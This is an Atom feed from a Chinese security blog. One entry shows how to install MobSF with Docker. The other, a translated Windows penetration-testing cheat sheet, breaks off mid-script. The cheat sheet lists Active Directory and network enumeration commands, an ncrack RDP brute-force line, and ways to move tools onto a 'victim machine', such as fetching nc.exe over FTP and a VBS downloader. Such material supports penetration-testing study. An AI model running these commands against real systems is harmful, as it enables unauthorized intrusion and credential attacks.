<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>madcoding’s blog</title>
  
  <subtitle>学习，沉淀，分享，交流</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mad-coding.cn/"/>
  <updated>2019-10-11T08:44:40.739Z</updated>
  <id>https://www.mad-coding.cn/</id>
  
  <author>
    <name>madcoding</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用docker安装移动安全框架（MobSF）</title>
    <link href="https://www.mad-coding.cn/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/"/>
    <id>https://www.mad-coding.cn/2019/10/11/使用docker安装移动安全框架（MobSF）/</id>
    <published>2019-10-11T08:24:31.000Z</published>
    <updated>2019-10-11T08:44:40.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由<a href="https://github.com/MobSF/CapFuzz" target="_blank" rel="noopener">CapFuzz</a>（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。</p><a id="more"></a><h1 id="0x01-开始安装"><a href="#0x01-开始安装" class="headerlink" title="0x01 开始安装"></a>0x01 开始安装</h1><blockquote><p>安装环境：</p><p>Kali Linux x64</p><p>Docker</p><p>Python3.6环境</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#使用python3环境</span></span><br><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure><p>选择python3前面的编号</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011164429.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卸载docker，如何之前安装的话</span></span><br><span class="line">apt-get purge docker.io</span><br></pre></td></tr></table></figure><p>下载docker安装包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  https://download.docker.com/linux/debian/dists/jessie/pool/stable/amd64/docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162729.png" class="lozad"></p><p>安装docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg  -i docker-ce_17.06.2~ce-0~debian_amd64.deb</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162757.png" class="lozad"></p><p>启动docker服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service  docker restart</span><br></pre></td></tr></table></figure><p>docker一键部署framework-mobsf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull opensecurity/mobile-security-framework-mobsf</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162850.png" class="lozad"></p><h1 id="0x02-开始使用"><a href="#0x02-开始使用" class="headerlink" title="0x02 开始使用"></a>0x02 开始使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure><p>然后在kali中使用获取浏览器访问：htpp://0.0.0.0:8000</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011162947.png" class="lozad"></p><p>或者使用ifconfig命令查看kali的ip地址，然后使用<a href="http://kali的ip地址:8000访问" target="_blank" rel="noopener">http://kali的ip地址:8000访问</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011163001.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011163010.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>如果不适用docker一键化部署的话，可能非常的繁琐，所以这里使用了docker进行一键化部署，由于是同事推荐的，然后直接教我怎么部署了，这里也避免走了一些坑，所以大家在部署的过程中还碰到坑的话，就自行百度吧 ^v^.</p><p><img alt="img" data-src="https://i01piccdn.sogoucdn.com/f8a32ef987767296" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由&lt;a href=&quot;https://github.com/MobSF/CapFuzz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CapFuzz&lt;/a&gt;（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="MobSF" scheme="https://www.mad-coding.cn/tags/MobSF/"/>
    
  </entry>
  
  <entry>
    <title>Windows Notes</title>
    <link href="https://www.mad-coding.cn/2019/10/11/Windows-Notes/"/>
    <id>https://www.mad-coding.cn/2019/10/11/Windows-Notes/</id>
    <published>2019-10-11T07:37:46.000Z</published>
    <updated>2019-10-11T08:23:22.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。</p><p>原文链接：<a href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html</a></p><a id="more"></a><h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">net users</span><br><span class="line">net users /domain</span><br><span class="line">net localgroup</span><br><span class="line">net groups /domain</span><br><span class="line">net groups /domain &quot;Domain Admins&quot;</span><br><span class="line"></span><br><span class="line">Get-ADUser</span><br><span class="line">Get-Domain</span><br><span class="line">Get-DomainUser</span><br><span class="line">Get-DomainGroup</span><br><span class="line">Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10</span><br><span class="line">Find-DomainShare</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Host Discovery</span><br><span class="line">netdiscover -r subnet/24</span><br><span class="line">nbtscan -r [range]</span><br><span class="line">for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Reverse DNS Lookup</span><br><span class="line">$ComputerIPAddress = &quot;10.10.14.14&quot;</span><br><span class="line">[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName</span><br></pre></td></tr></table></figure><p><a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></p><h3 id="1-1-1-具有SPN的用户"><a href="#1-1-1-具有SPN的用户" class="headerlink" title="1.1.1 具有SPN的用户"></a>1.1.1 具有SPN的用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN</span><br><span class="line"></span><br><span class="line">Get-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,</span><br><span class="line">PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span><br></pre></td></tr></table></figure><h3 id="1-1-2-Kerberos枚举"><a href="#1-1-2-Kerberos枚举" class="headerlink" title="1.1.2 Kerberos枚举"></a>1.1.2 Kerberos枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&apos;test&apos;</span><br></pre></td></tr></table></figure><h3 id="1-1-3-红队CSharp脚本"><a href="#1-1-3-红队CSharp脚本" class="headerlink" title="1.1.3 红队CSharp脚本"></a>1.1.3 红队CSharp脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScripts</span><br><span class="line"></span><br><span class="line">LDAPUtility.cs</span><br><span class="line"></span><br><span class="line">Usage: ldaputility.exe options domain [arguments]</span><br><span class="line"></span><br><span class="line">ldaputility.exe DumpAllUsers m0chan</span><br><span class="line">ldaputility.exe DumpUser m0chan mr.un1k0d3r</span><br><span class="line">ldaputility.exe DumpUsersEmail m0chan</span><br><span class="line">ldaputility.exe DumpAllComputers m0chan </span><br><span class="line">ldaputility.exe DumpComputer m0chan DC01</span><br><span class="line">ldaputility.exe DumpAllGroups m0chan</span><br><span class="line">ldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;</span><br><span class="line">ldaputility.exe DumpPasswordPolicy m0chan</span><br><span class="line"></span><br><span class="line">Also WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.</span><br><span class="line"></span><br><span class="line">See github linked above for full details.</span><br></pre></td></tr></table></figure><h3 id="1-1-4-活动目录"><a href="#1-1-4-活动目录" class="headerlink" title="1.1.4 活动目录"></a>1.1.4 活动目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:DomainName</span><br><span class="line">nltest /DCNAME:DomainName</span><br><span class="line">nltest /DSGETDC:DomainName</span><br><span class="line"></span><br><span class="line"># Get Current Domain Info - Similar to Get-Domain</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</span><br><span class="line"></span><br><span class="line"># Get Domain Trust Info - Similar to Get-DomainTrust</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View Domain Info</span><br><span class="line">[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</span><br><span class="line"></span><br><span class="line">#  View Domain Trust Information</span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&apos;Forest&apos;, &apos;forest-of-interest.local&apos;)))).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line">nltest [server:&lt;fqdn_foreign_domain&gt;] /domain_trusts /all_trusts /v</span><br><span class="line"></span><br><span class="line">nltest /dsgetfti:&lt;domain&gt;</span><br><span class="line"></span><br><span class="line">nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts</span><br><span class="line"></span><br><span class="line">([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"># View All Domain Controllers</span><br><span class="line">nltest /dclist:offense.local</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line"># View DC for Current Session</span><br><span class="line">nltest /dsgetdc:m0chanAD.local</span><br><span class="line"></span><br><span class="line"># View Domain Trusts from CMD</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"># View User Info from CMD</span><br><span class="line">nltest /user:&quot;m0chan&quot;</span><br><span class="line"></span><br><span class="line"># get domain name and DC the user authenticated to</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># Get All Logged on Sessions, Includes NTLM &amp; Kerberos</span><br><span class="line">klist sessions</span><br><span class="line"></span><br><span class="line"># View Kerb Tickets</span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"># View Cached Krbtgt</span><br><span class="line">klist tgt</span><br><span class="line"></span><br><span class="line"># whoami on older Windows systems</span><br><span class="line">set u</span><br><span class="line"></span><br><span class="line">#List all Usernames</span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List Administrators</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname</span><br><span class="line"></span><br><span class="line">#List all Info about Specific User</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties</span><br><span class="line"></span><br><span class="line">#View All Users with Description Field Set</span><br><span class="line"></span><br><span class="line">([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125;</span><br></pre></td></tr></table></figure><h3 id="1-1-5-从Linux-Box进行AD枚举-AD工具"><a href="#1-1-5-从Linux-Box进行AD枚举-AD工具" class="headerlink" title="1.1.5 从Linux Box进行AD枚举-AD工具"></a>1.1.5 从Linux Box进行AD枚举-AD工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jasonwbarnett/linux-adtool</span><br><span class="line"></span><br><span class="line">tar zxvf adtools-1.x.tar.gz</span><br><span class="line">cd adtools-1.x</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">&gt; adtool list ou=user,dc=example,dc=com</span><br><span class="line">CN=allusers,OU=user,DC=example,DC=com</span><br><span class="line">OU=finance,OU=user,DC=example,DC=com</span><br><span class="line">OU=administration,OU=user,DC=example,DC=com</span><br><span class="line"></span><br><span class="line">&gt; adtool oucreate marketing ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com</span><br><span class="line">&gt; adtool setpass jsmith banana</span><br><span class="line">&gt; adtool unlock jsmith</span><br><span class="line">&gt; adtool groupadd allusers jsmith</span><br><span class="line">&gt; adtool attributereplace jsmith telephonenumber 123</span><br><span class="line">&gt; adtool attributereplace jsmith mail jsmith@example.com</span><br></pre></td></tr></table></figure><h3 id="1-1-6-SharpView枚举"><a href="#1-1-6-SharpView枚举" class="headerlink" title="1.1.6 SharpView枚举"></a>1.1.6 SharpView枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/tevora-threat/SharpView</span><br><span class="line"></span><br><span class="line">Get-DomainFileServer</span><br><span class="line">Get-DomainGPOUserLocalGroupMapping</span><br><span class="line">Find-GPOLocation</span><br><span class="line">Get-DomainGPOComputerLocalGroupMapping</span><br><span class="line">Find-GPOComputerAdmin</span><br><span class="line">Get-DomainObjectAcl</span><br><span class="line">Get-ObjectAcl</span><br><span class="line">Add-DomainObjectAcl</span><br><span class="line">Add-ObjectAcl</span><br><span class="line">Remove-DomainObjectAcl</span><br><span class="line">Get-RegLoggedOn</span><br><span class="line">Get-LoggedOnLocal</span><br><span class="line">Get-NetRDPSession</span><br><span class="line">Test-AdminAccess</span><br><span class="line">Invoke-CheckLocalAdminAccess</span><br><span class="line">Get-WMIProcess</span><br><span class="line">Get-NetProcess</span><br><span class="line">Get-WMIRegProxy</span><br><span class="line">Get-Proxy</span><br><span class="line">Get-WMIRegLastLoggedOn</span><br><span class="line">Get-LastLoggedOn</span><br><span class="line">Get-WMIRegCachedRDPConnection</span><br><span class="line">Get-CachedRDPConnection</span><br><span class="line">Get-WMIRegMountedDrive</span><br><span class="line">Get-RegistryMountedDrive</span><br><span class="line">Find-InterestingDomainAcl</span><br><span class="line">Invoke-ACLScanner</span><br><span class="line">Get-NetShare</span><br><span class="line">Get-NetLoggedon</span><br></pre></td></tr></table></figure><h3 id="1-1-7-SMB枚举"><a href="#1-1-7-SMB枚举" class="headerlink" title="1.1.7 SMB枚举"></a>1.1.7 SMB枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 139,445 --script smb.nse,smb-enum-shares,smbls</span><br><span class="line">enum4linux 1.3.3.7</span><br><span class="line">smbmap -H 1.3.3.7</span><br><span class="line">smbclient -L \\INSERTIPADDRESS</span><br><span class="line">smbclient -L INSERTIPADDRESS</span><br><span class="line">smbclient //INSERTIPADDRESS/tmp</span><br><span class="line">smbclient \\\\INSERTIPADDRESS\\ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/ipc$ -U john</span><br><span class="line">smbclient //INSERTIPADDRESS/admin$ -U john</span><br><span class="line">nbtscan [SUBNET]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Check for SMB Signing</span><br><span class="line">nmap --script smb-security-mode.nse -p 445 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-8-SNMP枚举"><a href="#1-1-8-SNMP枚举" class="headerlink" title="1.1.8 SNMP枚举"></a>1.1.8 SNMP枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -c public -v1 10.10.14.14</span><br><span class="line">snmpcheck -t 10.10.14.14 -c public</span><br><span class="line">onesixtyone -c names -i hosts</span><br><span class="line">nmap -sT -p 161 10.10.14.14 -oG snmp_results.txt</span><br><span class="line">snmpenum -t 10.10.14.14</span><br></pre></td></tr></table></figure><h3 id="1-1-9-MySQL枚举"><a href="#1-1-9-MySQL枚举" class="headerlink" title="1.1.9 MySQL枚举"></a>1.1.9 MySQL枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122</span><br></pre></td></tr></table></figure><h3 id="1-1-10-DNS区域转移"><a href="#1-1-10-DNS区域转移" class="headerlink" title="1.1.10 DNS区域转移"></a>1.1.10 DNS区域转移</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig axfr blah.com @ns1.m0chan.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d m0chan.com</span><br><span class="line">dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span><br></pre></td></tr></table></figure><h3 id="1-1-11-LDAP"><a href="#1-1-11-LDAP" class="headerlink" title="1.1.11 LDAP"></a>1.1.11 LDAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://&lt;ip&gt;</span><br><span class="line">ldapwhoami</span><br></pre></td></tr></table></figure><h3 id="1-1-12-RPC枚举"><a href="#1-1-12-RPC枚举" class="headerlink" title="1.1.12 RPC枚举"></a>1.1.12 RPC枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;10.10.14.14&quot;</span><br><span class="line">srvinfo</span><br><span class="line">enumdomusers</span><br><span class="line">enumalsgroups domain</span><br><span class="line">lookupnames administrators</span><br><span class="line">querydominfo</span><br><span class="line">enumdomusers</span><br><span class="line">queryuser &lt;user&gt;</span><br><span class="line">lsaquery</span><br><span class="line">lookupnames Guest</span><br><span class="line">lookupnames Administrator</span><br></pre></td></tr></table></figure><h3 id="1-1-13-远程桌面"><a href="#1-1-13-远程桌面" class="headerlink" title="1.1.13 远程桌面"></a>1.1.13 远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u guest -p guest INSERTIPADDRESS -g 94%</span><br><span class="line"></span><br><span class="line"># Brute force</span><br><span class="line">ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS</span><br></pre></td></tr></table></figure><h1 id="0x02-文件传输"><a href="#0x02-文件传输" class="headerlink" title="0x02 文件传输"></a>0x02 文件传输</h1><h2 id="2-1-TFTP"><a href="#2-1-TFTP" class="headerlink" title="2.1 TFTP"></a>2.1 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m0chan Machine</span><br><span class="line">mkdir tftp</span><br><span class="line">atftpd --deamon --port 69 tftp</span><br><span class="line">cp *file* tftp</span><br><span class="line">On victim machine:</span><br><span class="line">tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt;</span><br></pre></td></tr></table></figure><h2 id="2-2-FTP"><a href="#2-2-FTP" class="headerlink" title="2.2 FTP"></a>2.2 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open &lt;[IP]&gt; 21 &gt; ftp.txt</span><br><span class="line">echo USER demo &gt;&gt; ftp.txt</span><br><span class="line">echo ftp &gt;&gt; ftp.txt</span><br><span class="line">echo bin &gt;&gt; ftp.txt</span><br><span class="line">echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line">ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure><h2 id="2-3-VBS-Script"><a href="#2-3-VBS-Script" class="headerlink" title="2.3 VBS Script"></a>2.3 VBS Script</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; 